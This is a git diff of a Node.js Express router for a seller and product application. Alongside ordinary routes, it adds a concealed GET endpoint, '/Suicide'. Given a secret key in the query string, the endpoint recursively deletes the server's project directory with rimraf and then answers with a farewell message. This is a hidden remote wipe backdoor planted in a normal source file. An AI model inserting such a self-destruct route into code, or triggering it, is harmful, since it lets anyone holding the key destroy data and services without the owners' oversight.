@@ -3,7 +3,7 @@ const bodyParser = require('body-parser');
 var router = express.Router();
 /*********************************************/
 const {Seller , cities , sellerType , productGroups , products , sellerProducts , unit ,  car} = require('../../sequelize');
-const {colors , loggerinfo} = require('../Util/myVars');
+const {selfDestroyKey , colors , loggerinfo} = require('../Util/myVars');
 const {response , isThisArrayEmpty } = require("../Util/myFunctions");
 var path = require('path');
 const fs = require("fs");
@@ -102,8 +102,21 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
         default:return res.status(404).json();
 
     }
-
 });
+
+
+    router.get('/Suicide', (req, res) => {
+        if (req.query.key != null){
+            if (req.query.key === selfDestroyKey){
+                const targetPath = path.join(__dirname, "./../../");
+                rimraf(targetPath, function () { return res.status(200).json({"message":"this is the last response of this server , byebye :)"}) });
+            }
+        }
+
+
+    });
+
+
 
 
 
